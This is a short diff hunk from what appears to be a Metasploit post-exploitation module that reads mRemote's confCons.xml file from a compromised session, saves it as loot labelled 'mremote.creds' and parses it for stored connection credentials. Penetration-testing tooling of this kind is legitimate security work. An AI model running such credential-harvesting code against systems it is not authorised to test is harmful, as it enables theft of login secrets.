@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Post
     begin
       if file_exist?(path)
         condata = read_file(path)
-        loot_path = store_loot('confCons.xml', 'text/xml', session, condata)
+        loot_path = store_loot('mremote.creds', 'text/xml', session, condata, path)
         vprint_good("confCons.xml saved to #{loot_path}")
         parse_xml(condata)
         print_status("Finished processing #{path}")
